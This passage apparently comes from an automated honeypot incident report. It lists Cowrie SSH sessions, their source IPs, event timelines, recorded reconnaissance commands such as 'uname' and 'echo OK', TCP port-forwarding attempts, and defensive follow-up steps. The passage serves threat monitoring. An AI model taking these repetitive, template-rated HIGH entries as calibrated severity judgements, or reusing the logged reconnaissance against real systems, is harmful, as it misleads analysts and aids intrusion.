| `2026-07-15 07:55:16` | `cowrie.log.closed` |
| `2026-07-15 07:55:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f903b46209e9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:55 |
| **Last Seen** | 2026-07-15 07:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:55:19` | `cowrie.session.connect` |
| `2026-07-15 07:55:19` | `cowrie.client.version` |
| `2026-07-15 07:55:19` | `cowrie.client.kex` |
| `2026-07-15 07:55:20` | `cowrie.login.success` |
| `2026-07-15 07:55:21` | `cowrie.session.params` |
| `2026-07-15 07:55:21` | `cowrie.command.input` |
| `2026-07-15 07:55:21` | `cowrie.log.closed` |
| `2026-07-15 07:55:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-374380cd64b0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:55 |
| **Last Seen** | 2026-07-15 07:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:55:25` | `cowrie.session.connect` |
| `2026-07-15 07:55:25` | `cowrie.client.version` |
| `2026-07-15 07:55:25` | `cowrie.client.kex` |
| `2026-07-15 07:55:26` | `cowrie.login.success` |
| `2026-07-15 07:55:26` | `cowrie.session.params` |
| `2026-07-15 07:55:26` | `cowrie.command.input` |
| `2026-07-15 07:55:27` | `cowrie.log.closed` |
| `2026-07-15 07:55:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e9bb1a28505

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:55 |
| **Last Seen** | 2026-07-15 07:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:55:31` | `cowrie.session.connect` |
| `2026-07-15 07:55:32` | `cowrie.client.version` |
| `2026-07-15 07:55:32` | `cowrie.client.kex` |
| `2026-07-15 07:55:32` | `cowrie.login.success` |
| `2026-07-15 07:55:34` | `cowrie.session.params` |
| `2026-07-15 07:55:34` | `cowrie.command.input` |
| `2026-07-15 07:55:34` | `cowrie.log.closed` |
| `2026-07-15 07:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d3cefc58c63

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:55 |
| **Last Seen** | 2026-07-15 07:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:55:37` | `cowrie.session.connect` |
| `2026-07-15 07:55:38` | `cowrie.client.version` |
| `2026-07-15 07:55:38` | `cowrie.client.kex` |
| `2026-07-15 07:55:39` | `cowrie.login.success` |
| `2026-07-15 07:55:40` | `cowrie.session.params` |
| `2026-07-15 07:55:40` | `cowrie.command.input` |
| `2026-07-15 07:55:40` | `cowrie.log.closed` |
| `2026-07-15 07:55:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81c8d0958812

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:55 |
| **Last Seen** | 2026-07-15 07:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:55:43` | `cowrie.session.connect` |
| `2026-07-15 07:55:43` | `cowrie.client.version` |
| `2026-07-15 07:55:44` | `cowrie.client.kex` |
| `2026-07-15 07:55:44` | `cowrie.login.success` |
| `2026-07-15 07:55:45` | `cowrie.session.params` |
| `2026-07-15 07:55:45` | `cowrie.command.input` |
| `2026-07-15 07:55:45` | `cowrie.log.closed` |
| `2026-07-15 07:55:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c74cf67f05b9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:55 |
| **Last Seen** | 2026-07-15 07:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:55:49` | `cowrie.session.connect` |
| `2026-07-15 07:55:49` | `cowrie.client.version` |
| `2026-07-15 07:55:49` | `cowrie.client.kex` |
| `2026-07-15 07:55:50` | `cowrie.login.success` |
| `2026-07-15 07:55:50` | `cowrie.session.params` |
| `2026-07-15 07:55:50` | `cowrie.command.input` |
| `2026-07-15 07:55:51` | `cowrie.log.closed` |
| `2026-07-15 07:55:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6ac9f0bfd34

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:55 |
| **Last Seen** | 2026-07-15 07:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:55:55` | `cowrie.session.connect` |
| `2026-07-15 07:55:55` | `cowrie.client.version` |
| `2026-07-15 07:55:55` | `cowrie.client.kex` |
| `2026-07-15 07:55:56` | `cowrie.login.success` |
| `2026-07-15 07:55:56` | `cowrie.session.params` |
| `2026-07-15 07:55:56` | `cowrie.command.input` |
| `2026-07-15 07:55:57` | `cowrie.log.closed` |
| `2026-07-15 07:55:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e01c1d351fde

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:56 |
| **Last Seen** | 2026-07-15 07:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:56:01` | `cowrie.session.connect` |
| `2026-07-15 07:56:01` | `cowrie.client.version` |
| `2026-07-15 07:56:01` | `cowrie.client.kex` |
| `2026-07-15 07:56:02` | `cowrie.login.success` |
| `2026-07-15 07:56:02` | `cowrie.session.params` |
| `2026-07-15 07:56:02` | `cowrie.command.input` |
| `2026-07-15 07:56:03` | `cowrie.log.closed` |
| `2026-07-15 07:56:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04d77dc4b44b

| Field | Detail |
|---|---|
| **Source IP** | `51.75.142[.]157` |
| **First Seen** | 2026-07-15 07:56 |
| **Last Seen** | 2026-07-15 07:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:56:01` | `cowrie.session.connect` |
| `2026-07-15 07:56:02` | `cowrie.client.version` |
| `2026-07-15 07:56:02` | `cowrie.client.kex` |
| `2026-07-15 07:56:03` | `cowrie.login.success` |
| `2026-07-15 07:56:03` | `cowrie.direct-tcpip.request` |
| `2026-07-15 07:56:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.142[.]157` to AbuseIPDB if not already reported
- [ ] Block `51.75.142[.]157` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2aee877bac4f

| Field | Detail |
|---|---|
| **Source IP** | `182.225.134[.]13` |
| **First Seen** | 2026-07-15 07:56 |
| **Last Seen** | 2026-07-15 07:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:56:04` | `cowrie.session.connect` |
| `2026-07-15 07:56:05` | `cowrie.client.version` |
| `2026-07-15 07:56:05` | `cowrie.client.kex` |
| `2026-07-15 07:56:08` | `cowrie.login.success` |
| `2026-07-15 07:56:09` | `cowrie.direct-tcpip.request` |
| `2026-07-15 07:56:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.225.134[.]13` to AbuseIPDB if not already reported
- [ ] Block `182.225.134[.]13` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3b5dc278875

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:56 |
| **Last Seen** | 2026-07-15 07:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:56:07` | `cowrie.session.connect` |
| `2026-07-15 07:56:07` | `cowrie.client.version` |
| `2026-07-15 07:56:07` | `cowrie.client.kex` |
| `2026-07-15 07:56:09` | `cowrie.login.success` |
| `2026-07-15 07:56:10` | `cowrie.session.params` |
| `2026-07-15 07:56:10` | `cowrie.command.input` |
| `2026-07-15 07:56:10` | `cowrie.log.closed` |
| `2026-07-15 07:56:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8df72cab9582

| Field | Detail |
|---|---|
| **Source IP** | `65.20.133[.]56` |
| **First Seen** | 2026-07-15 07:56 |
| **Last Seen** | 2026-07-15 07:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:56:08` | `cowrie.session.connect` |
| `2026-07-15 07:56:08` | `cowrie.client.version` |
| `2026-07-15 07:56:08` | `cowrie.client.kex` |
| `2026-07-15 07:56:10` | `cowrie.login.success` |
| `2026-07-15 07:56:10` | `cowrie.direct-tcpip.request` |
| `2026-07-15 07:56:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.133[.]56` to AbuseIPDB if not already reported
- [ ] Block `65.20.133[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66cadb86813b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:56 |
| **Last Seen** | 2026-07-15 07:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:56:13` | `cowrie.session.connect` |
| `2026-07-15 07:56:13` | `cowrie.client.version` |
| `2026-07-15 07:56:13` | `cowrie.client.kex` |
| `2026-07-15 07:56:14` | `cowrie.login.success` |
| `2026-07-15 07:56:15` | `cowrie.session.params` |
| `2026-07-15 07:56:15` | `cowrie.command.input` |
| `2026-07-15 07:56:15` | `cowrie.log.closed` |
| `2026-07-15 07:56:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91a75dc95933

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:56 |
| **Last Seen** | 2026-07-15 07:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:56:18` | `cowrie.session.connect` |
| `2026-07-15 07:56:19` | `cowrie.client.version` |
| `2026-07-15 07:56:19` | `cowrie.client.kex` |
| `2026-07-15 07:56:19` | `cowrie.login.success` |
| `2026-07-15 07:56:20` | `cowrie.session.params` |
| `2026-07-15 07:56:20` | `cowrie.command.input` |
| `2026-07-15 07:56:20` | `cowrie.log.closed` |
| `2026-07-15 07:56:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3e09a1294af

| Field | Detail |
|---|---|
| **Source IP** | `118.45.255[.]153` |
| **First Seen** | 2026-07-15 07:56 |
| **Last Seen** | 2026-07-15 07:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:56:19` | `cowrie.session.connect` |
| `2026-07-15 07:56:19` | `cowrie.client.version` |
| `2026-07-15 07:56:19` | `cowrie.client.kex` |
| `2026-07-15 07:56:22` | `cowrie.login.success` |
| `2026-07-15 07:56:23` | `cowrie.direct-tcpip.request` |
| `2026-07-15 07:56:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.45.255[.]153` to AbuseIPDB if not already reported
- [ ] Block `118.45.255[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cce7befe503f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:56 |
| **Last Seen** | 2026-07-15 07:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:56:26` | `cowrie.session.connect` |
| `2026-07-15 07:56:26` | `cowrie.client.version` |
| `2026-07-15 07:56:26` | `cowrie.client.kex` |
| `2026-07-15 07:56:27` | `cowrie.login.success` |
| `2026-07-15 07:56:27` | `cowrie.session.params` |
| `2026-07-15 07:56:27` | `cowrie.command.input` |
| `2026-07-15 07:56:28` | `cowrie.log.closed` |
| `2026-07-15 07:56:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c08c17d2286

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:56 |
| **Last Seen** | 2026-07-15 07:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:56:31` | `cowrie.session.connect` |
| `2026-07-15 07:56:31` | `cowrie.client.version` |
| `2026-07-15 07:56:31` | `cowrie.client.kex` |
| `2026-07-15 07:56:32` | `cowrie.login.success` |
| `2026-07-15 07:56:32` | `cowrie.session.params` |
| `2026-07-15 07:56:32` | `cowrie.command.input` |
| `2026-07-15 07:56:33` | `cowrie.log.closed` |
| `2026-07-15 07:56:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d1a9528ca19

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]135` |
| **First Seen** | 2026-07-15 07:56 |
| **Last Seen** | 2026-07-15 07:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:56:33` | `cowrie.session.connect` |
| `2026-07-15 07:56:33` | `cowrie.client.version` |
| `2026-07-15 07:56:33` | `cowrie.client.kex` |
| `2026-07-15 07:56:35` | `cowrie.login.success` |
| `2026-07-15 07:56:35` | `cowrie.direct-tcpip.request` |
| `2026-07-15 07:56:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]135` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]135` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36f7228f7d9a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:56 |
| **Last Seen** | 2026-07-15 07:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:56:37` | `cowrie.session.connect` |
| `2026-07-15 07:56:37` | `cowrie.client.version` |
| `2026-07-15 07:56:37` | `cowrie.client.kex` |
| `2026-07-15 07:56:38` | `cowrie.login.success` |
| `2026-07-15 07:56:39` | `cowrie.session.params` |
| `2026-07-15 07:56:39` | `cowrie.command.input` |
| `2026-07-15 07:56:39` | `cowrie.log.closed` |
| `2026-07-15 07:56:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f684c99d9bf

| Field | Detail |
|---|---|
| **Source IP** | `85.152.57[.]60` |
| **First Seen** | 2026-07-15 07:56 |
| **Last Seen** | 2026-07-15 07:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:56:40` | `cowrie.session.connect` |
| `2026-07-15 07:56:41` | `cowrie.client.version` |
| `2026-07-15 07:56:41` | `cowrie.client.kex` |
| `2026-07-15 07:56:42` | `cowrie.login.success` |
| `2026-07-15 07:56:42` | `cowrie.direct-tcpip.request` |
| `2026-07-15 07:56:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.152.57[.]60` to AbuseIPDB if not already reported
- [ ] Block `85.152.57[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f2392f21bd3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:56 |
| **Last Seen** | 2026-07-15 07:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:56:43` | `cowrie.session.connect` |
| `2026-07-15 07:56:43` | `cowrie.client.version` |
| `2026-07-15 07:56:43` | `cowrie.client.kex` |
| `2026-07-15 07:56:44` | `cowrie.login.success` |
| `2026-07-15 07:56:44` | `cowrie.session.params` |
| `2026-07-15 07:56:44` | `cowrie.command.input` |
| `2026-07-15 07:56:45` | `cowrie.log.closed` |
| `2026-07-15 07:56:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f512ec8aec8

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 07:56 |
| **Last Seen** | 2026-07-15 07:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:56:52` | `cowrie.session.connect` |
| `2026-07-15 07:56:52` | `cowrie.client.version` |
| `2026-07-15 07:56:52` | `cowrie.client.kex` |
| `2026-07-15 07:56:52` | `cowrie.login.success` |
| `2026-07-15 07:56:53` | `cowrie.session.params` |
| `2026-07-15 07:56:53` | `cowrie.command.input` |
| `2026-07-15 07:56:53` | `cowrie.log.closed` |
| `2026-07-15 07:56:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b05abe161a5f

| Field | Detail |
|---|---|
| **Source IP** | `45.33.12[.]122` |
| **First Seen** | 2026-07-15 08:03 |
| **Last Seen** | 2026-07-15 08:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept: */*, Accept-Encoding: gzip, User-Agent: Mozilla/5.0 zgrab/0.x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 08:03:59` | `cowrie.session.connect` |
| `2026-07-15 08:03:59` | `cowrie.login.success` |
| `2026-07-15 08:03:59` | `cowrie.session.params` |
| `2026-07-15 08:03:59` | `cowrie.command.input` |
| `2026-07-15 08:03:59` | `cowrie.command.failed` |
| `2026-07-15 08:03:59` | `cowrie.command.input` |
| `2026-07-15 08:03:59` | `cowrie.command.failed` |
| `2026-07-15 08:03:59` | `cowrie.command.input` |
| `2026-07-15 08:03:59` | `cowrie.command.failed` |
| `2026-07-15 08:03:59` | `cowrie.command.input` |
| `2026-07-15 08:04:00` | `cowrie.log.closed` |
| `2026-07-15 08:04:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.12[.]122` to AbuseIPDB if not already reported
- [ ] Block `45.33.12[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b258ed7a60d6

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 08:14 |
| **Last Seen** | 2026-07-15 08:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 08:14:29` | `cowrie.session.connect` |
| `2026-07-15 08:14:29` | `cowrie.client.version` |
| `2026-07-15 08:14:29` | `cowrie.client.kex` |
| `2026-07-15 08:14:30` | `cowrie.login.success` |
| `2026-07-15 08:14:30` | `cowrie.session.params` |
| `2026-07-15 08:14:30` | `cowrie.command.input` |
| `2026-07-15 08:14:31` | `cowrie.log.closed` |
| `2026-07-15 08:14:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3592a26c8ec2

| Field | Detail |
|---|---|
| **Source IP** | `101.13.4[.]119` |
| **First Seen** | 2026-07-15 08:19 |
| **Last Seen** | 2026-07-15 08:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 08:19:24` | `cowrie.session.connect` |
| `2026-07-15 08:19:25` | `cowrie.client.version` |
| `2026-07-15 08:19:25` | `cowrie.client.kex` |
| `2026-07-15 08:19:28` | `cowrie.login.success` |
| `2026-07-15 08:19:28` | `cowrie.direct-tcpip.request` |
| `2026-07-15 08:19:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.4[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.13.4[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d05b9c39e52

| Field | Detail |
|---|---|
| **Source IP** | `220.93.167[.]144` |
